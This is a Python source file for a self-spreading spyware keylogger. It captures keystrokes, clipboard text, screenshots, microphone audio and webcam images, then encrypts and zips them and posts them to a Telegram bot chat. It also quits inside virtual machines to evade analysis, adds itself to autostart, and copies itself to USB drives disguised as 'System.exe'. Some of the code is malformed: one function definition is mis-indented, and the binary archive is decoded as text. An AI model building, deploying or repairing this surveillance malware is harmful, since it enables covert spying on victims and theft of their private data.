import os
import time
import logging
import threading
import pyperclip
import pyscreenshot as ImageGrab
import pyaudio
import wave
import cv2
import smtplib
import zipfile
import shutil
import socket
import sys
import json
import subprocess
import ctypes
from cryptography.fernet import Fernet
from pynput.keyboard import Listener
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import requests

#  Encryption Key (Save this for decryption) 
KEY = Fernet.generate_key()
cipher = Fernet(KEY)

#  File Paths 
LOG_FILE = "/tmp/keylog.txt"
ENC_LOG_FILE = "/tmp/keylog.enc"
SCREENSHOT_FOLDER = "/tmp/screenshots"
AUDIO_FILE = "/tmp/recording.wav"
WEBCAM_FILE = "/tmp/webcam.jpg"
COMPRESSED_LOG = "/tmp/logs.zip"
SELF_NAME = sys.argv[0]
EMAIL = "your-email@gmail.com"  # Set your email
PASSWORD = "your-password"  # Set your email password
TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
TELEGRAM_CHAT_ID = "@mrbladestalker0093"

os.makedirs(SCREENSHOT_FOLDER, exist_ok=True)

#  Logging Setup 
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s - %(message)s")

def encrypt_logs():
    """ Encrypts log files for security """
    try:
        with open(LOG_FILE, "rb") as f:
            encrypted_data = cipher.encrypt(f.read())
        with open(ENC_LOG_FILE, "wb") as f:
            f.write(encrypted_data)
        os.remove(LOG_FILE)
    except Exception as e:
        logging.error(f"Encryption failed: {str(e)}")

def compress_logs():
    """ Compress logs into a ZIP file """
    try:
        with zipfile.ZipFile(COMPRESSED_LOG, 'w') as zipf:
            zipf.write(ENC_LOG_FILE)
            for file in os.listdir(SCREENSHOT_FOLDER):
                zipf.write(os.path.join(SCREENSHOT_FOLDER, file))
            zipf.write(AUDIO_FILE)
            zipf.write(WEBCAM_FILE)
    except Exception as e:
        logging.error(f"Compression failed: {str(e)}")

def send_to_telegram(message):
    """ Sends log file via Telegram """
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message
    }
    response = requests.post(url, json=payload)
    return response.json()

def take_screenshot():
    """ Takes a screenshot every 20 seconds """
    while True:
        try:
            img = ImageGrab.grab()
            img.save(f"{SCREENSHOT_FOLDER}/screenshot_{int(time.time())}.png")
        except Exception as e:
            logging.error(f"Screenshot failed: {str(e)}")
        time.sleep(20)

def get_clipboard():
    """ Logs clipboard data every 5 seconds """
    prev_clip = ""
    while True:
        try:
            clip_data = pyperclip.paste()
            if clip_data != prev_clip:
                prev_clip = clip_data
                with open(LOG_FILE, "a") as f:
                    f.write(f"\n[CLIPBOARD]: {clip_data}\n")
        except Exception as e:
            logging.error(f"Clipboard logging failed: {str(e)}")
        time.sleep(5)

def record_audio():
    """ Records microphone audio continuously """
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
    frames = []

    while True:
        try:
            frames.append(stream.read(CHUNK))
            if len(frames) > RATE / CHUNK * 60:  # Save every 60 seconds
                with wave.open(AUDIO_FILE, "wb") as wf:
                    wf.setnchannels(CHANNELS)
                    wf.setsampwidth(p.get_sample_size(FORMAT))
                    wf.setframerate(RATE)
                    wf.writeframes(b''.join(frames))
                frames.clear()
        except Exception as e:
            logging.error(f"Audio recording failed: {str(e)}")
            def capture_webcam():
    """ Captures webcam images every 60 seconds """
    while True:
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                cv2.imwrite(WEBCAM_FILE, frame)
            cap.release()
        except Exception as e:
            logging.error(f"Webcam capture failed: {str(e)}")
        time.sleep(60)

def check_vm():
    """ Detects Virtual Machines """
    vm_keywords = ["VMware", "VirtualBox", "QEMU", "Hyper-V"]
    try:
        output = subprocess.getoutput("dmidecode | grep -i 'product name'")
        for keyword in vm_keywords:
            if keyword.lower() in output.lower():
                sys.exit()
    except Exception as e:
        logging.error(f"VM detection failed: {str(e)}")

def persist():
    """ Auto-start on boot (Linux) """
    dest = os.path.join(os.path.expanduser("~"), ".config/autostart/keylogger.desktop")
    if not os.path.exists(dest):
        try:
            with open(dest, "w") as f:
                f.write(f"[Desktop Entry]\nType=Application\nExec={SELF_NAME}\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName[en_US]=Keylogger\nName=Keylogger\nComment[en_US]=\nComment=\n")
            subprocess.call(f'chmod +x {dest}', shell=True)
        except Exception as e:
            logging.error(f"Persistence setup failed: {str(e)}")

def spread_usb():
    """ Copies itself to USB drives """
    while True:
        try:
            drives = [d for d in os.popen("lsblk -o NAME,TYPE,MOUNTPOINT | grep 'part' | awk '{print $1}'").read().split() if "C:" not in d]
            for drive in drives:
                dest = os.path.join("/media", drive, "System.exe")
                if not os.path.exists(dest):
                    shutil.copy(SELF_NAME, dest)
        except Exception as e:
            logging.error(f"USB spread failed: {str(e)}")
        time.sleep(60)

def stealth_mode():
    """ Hides from Task Manager """
    if sys.platform == "linux":  # Linux
        os.system("clear")  # Clear the terminal

def on_press(key):
    """ Captures keystrokes """
    try:
        logging.info(f"{key.char}")
    except AttributeError:
        logging.info(f"[{key}]")

def send_logs():
    """ Encrypt, Compress, and Send Logs """
    encrypt_logs()
    compress_logs()
    with open(COMPRESSED_LOG, "rb") as f:
        send_to_telegram(f.read().decode('utf-8'))

#  Start Threads 
threading.Thread(target=get_clipboard, daemon=True).start()
threading.Thread(target=take_screenshot, daemon=True).start()
threading.Thread(target=record_audio, daemon=True).start()
threading.Thread(target=capture_webcam, daemon=True).start()
threading.Thread(target=spread_usb, daemon=True).start()

#  Start Keylogger 
stealth_mode()
check_vm()
persist()
with Listener(on_press=on_press) as listener:
    listener.join()

#  Send Logs 
send_logs()
